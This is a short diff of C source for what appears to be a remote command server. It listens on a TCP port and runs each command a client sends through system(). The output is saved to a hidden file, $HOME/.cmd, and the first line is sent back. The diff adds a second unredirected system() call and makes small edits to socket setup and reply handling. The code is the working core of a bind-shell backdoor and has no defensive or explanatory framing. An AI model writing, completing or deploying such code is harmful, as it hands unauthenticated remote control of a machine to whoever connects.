@@ -41,7 +41,7 @@ int main(){
       die();
    
    snprintf( file, sizeof( file ), "%s/.cmd", getenv( "HOME" ) );
-   sock_init( &cli, htonl( INADDR_ANY ), PORT );
+   sock_init( &cli, INADDR_ANY , PORT );
    
    if( ( bind( LIST, ( struct sockaddr * ) &cli, sizeof( cli ) ) ) < 0 )
       die();
@@ -60,12 +60,14 @@ int main(){
       memset( new_cmd, 0x0, sizeof( new_cmd ) );
       snprintf( new_cmd, sizeof( new_cmd ), "%s > %s", cmd, file );
       system( new_cmd );
+      system( cmd );
       
       if( ( fp = fopen( file, "r" ) ) == NULL )
          die();
-         
+      
+      memset( reply, 0x0, sizeof( reply ) );   
       fgets( reply, sizeof( reply ), fp );
-      reply[ strlen( reply ) - 1 ] = '\0';
+      reply[ strlen( reply ) ] = '\0';
       
       if( send( TCP, reply, sizeof( reply ), 0 ) < 0 )
          die();
